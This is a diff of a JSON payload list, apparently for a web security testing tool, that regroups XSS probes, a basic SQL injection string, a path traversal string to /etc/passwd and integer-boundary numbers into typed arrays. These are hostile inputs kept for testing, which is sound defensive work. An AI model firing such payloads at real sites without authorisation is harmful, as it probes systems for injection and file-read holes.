@@ -1,14 +1,54 @@
-{
-    "XSS": {
-        "img" : "\"><img/src=x onerror=alert(document.domain)",
-        "script" : "\"><script>alert(document.domain)</scirpt>",
-        "url" : "javascript:http://example.com/%0aalert%281%29",
-        "<!--" : "<!-- hoge=\"--><img src=x onerror=alert(1)\" -->"
-    },
-    "SQLi": {
-        "basic" : "' OR 1=1 --'"
-    },
-    "Path": {
-        "/etc/passwd" : "../../../../../../../../../../../../etc/passwd"
-    }
-}
+[
+  {
+    "type": "XSS",
+    "items": [
+      {
+        "key": "img",
+        "value": "\"><img/src=x onerror=alert(document.domain)>"
+      },
+      {
+        "key": "script",
+        "value": "\"><script>alert(document.domain)</scirpt>"
+      },
+      {
+        "key": "url",
+        "value": "javascript:http://example.com/%0aalert%281%29"
+      },
+      {
+        "key": "<!--",
+        "value": "<!-- hoge=\"--><img src=x onerror=alert(1)\" -->"
+      }
+    ]
+  },
+  {
+    "type": "SQLi",
+    "items": [
+      {
+        "key": "basic",
+        "value": "' OR 1=1 --'"
+      }
+    ]
+  },
+  {
+    "type": "Path",
+    "items": [
+      {
+        "key": "etcpasswd",
+        "value": "../../../../../../../../../../../../etc/passwd"
+      }
+    ]
+  },
+  {
+    "type": "Number",
+    "items": [
+      {
+        "key": "32768",
+        "value": "32768"
+      },
+      {
+        "key": "2147483648",
+        "value": "2147483648"
+      }
+    ]
+  }
+]
